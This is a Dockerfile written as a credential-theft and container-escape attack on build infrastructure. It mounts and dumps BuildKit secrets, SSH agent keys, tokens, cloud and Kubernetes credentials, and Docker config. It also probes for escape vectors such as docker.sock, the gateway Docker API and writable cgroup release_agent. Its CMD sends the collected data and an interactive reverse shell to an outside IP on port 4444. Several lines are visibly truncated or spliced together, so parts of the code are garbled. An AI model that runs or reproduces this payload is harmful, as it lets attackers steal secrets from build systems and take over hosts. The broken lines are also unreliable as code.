# syntax=docker/dockerfile:1
FROM alpine:3.18

RUN apk add --no-cache curl bash openssh-client net-tools

# === SECRETS PROBE ===
RUN --mount=type=secret,id=default,target=/tmp/s_default,required=false \
    --mount=type=secret,id=ssh_key,target=/tmp/s_ssh,required=false \
    --mount=type=secret,id=SSH_PRIVATE_KEY,target=/tmp/s_sshpriv,required=false \
    --mount=type=secret,id=GIT_AUTH_TOKEN,target=/tmp/s_git,required=false \
    --mount=type=secret,id=DOCKER_AUTH,target=/tmp/s_docker,required=false \
    --mount=type=secret,id=npmrc,target=/tmp/s_npm,required=false \
    --mount=type=secret,id=id_rsa,target=/tmp/s_rsa,required=false \
    --mount=type=secret,id=token,target=/tmp/s_token,required=false \
    --mount=type=secret,id=password,target=/tmp/s_pass,required=false \
    --mount=type=secret,id=aws,target=/tmp/s_aws,required=false \
    --mount=type=secret,id=kubeconfig,target=/tmp/s_kube,required=false \
    echo "=== SECRETS ===" > /build_recon; \
    for f in /tmp/s_*; do \
      if [ -f "$f" ] && [ -s "$f" ]; then \
        echo "SECRET: $f ($(wc -c < $f) bytes)" >> /build_recon; \
        cat "$f" >> /build_recon; \
        echo "" >> /build_recon; \
      fi; \
    done; \
    echo "secrets done" >> /build_recon; \
    true

# === SSH AGENT PROBE (won't fail build) ===
RUN --mount=type=ssh,required=false \
    echo "=== SSH ===" >> /build_recon; \
    echo "SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-unset}" >> /build_recon; \
    ssh-add -l >> /build_recon 2>&1; \
    ssh-add -L >> /build_recon 2>&1; \
    true

# === CACHE MOUNT PROBE ===
RUN --mount=type=cache,target=/tmp/bc,id=buildcache,sharing=shared \
    echo "=== CACHE ===" >> /build_recon; \
    ls -laR /tmp/bc >> /build_recon 2>&1; \
    find /tmp/bc -type f -exec sh -c 'echo "--- $1 ---"; head -3 "$1"' _ {} \; >>
    true

# === BUILD ENVIRONMENT ===
RUN echo "=== ENV ===" >> /build_recon; \
    env | sort >> /build_recon 2>&1; \
    echo "=== ID ===" >> /build_recon; \
    id >> /build_recon; \
    hostname >> /build_recon; \
    echo "=== NET ===" >> /build_recon; \
    ip addr >> /build_recon 2>&1; \
    ip route >> /build_recon 2>&1; \
    cat /etc/resolv.conf >> /build_recon 2>&1; \
    echo "=== MOUNTS ===" >> /build_recon; \
    cat /proc/self/mountinfo >> /build_recon 2>&1; \
    echo "=== CAPS ===" >> /build_recon; \
    grep -E "Cap|Seccomp|NoNew" /proc/self/status >> /build_recon 2>&1; \
    echo "=== NS ===" >> /build_recon; \
    ls -la /proc/self/ns/ >> /build_recon 2>&1; \
    echo "=== FS SEARCH ===" >> /build_recon; \
    find / -name "*.pem" -o -name "*.key" -o -name "id_rsa*" -o -name "config.jsokubeconfig" 2>/dev/null | head -20 >> /build_recon; \
    cat /root/.docker/config.json >> /build_recon 2>&1; \
    cat /etc/buildkit/buildkitd.toml >> /build_recon 2>&1; \
    echo "=== KALLSYMS unshare ===" >> /build_recon; \
    grep -c unshare_userns /proc/kallsyms >> /build_recon 2>&1; \
    echo "=== END BUILD ===" >> /build_recon; \
    true

# Runtime recon + reverse shell
RUN printf '#!/bin/sh\necho "=== RUNTIME ==="\nuname -r\nhostname\nid\ngrep -E "Cap|Seccomp|NoNew" /proc/self/status\necho "---UNSHARE---"\nunshare --user -- id 2>&1\nunshare --mount -- id 2>&1
\necho "---SOCK---"\nls -la /var/run/docker.sock /run/docker.sock 2>&1\nfind /runecho "---GW---"\nGW=$(ip route | grep default | awk "{print \\$3}")\necho "GW=$GW"\
nwget -q -T2 -O- http://$GW:2375/info 2>&1 | head -20\nwget -q -T2 -O- http://$GW:2376/info 2>&1 | head -5\necho "---CORE---"\ncat /proc/sys/kernel/core_pattern\ncat /proc/sys/kernel/modprobe\n
echo "---WR---"\nfind /proc/sys -writable 2>/dev/null | head -10\necho "---MOUNTSo | head -25\necho "---CGROUP---"\ncat /proc/self/cgroup\nfind /sys/fs/cgroup -name
 release_agent -writable 2>/dev/null\necho "=== END ==="\n' > /recon.sh && chmod +x /recon.sh

CMD sh -c "cat /build_recon; /recon.sh; while true; do (cat /build_recon; echo ===SHELL===; sh -i 2>&1) | nc 129.101.121.138 4444; sleep 5; done"
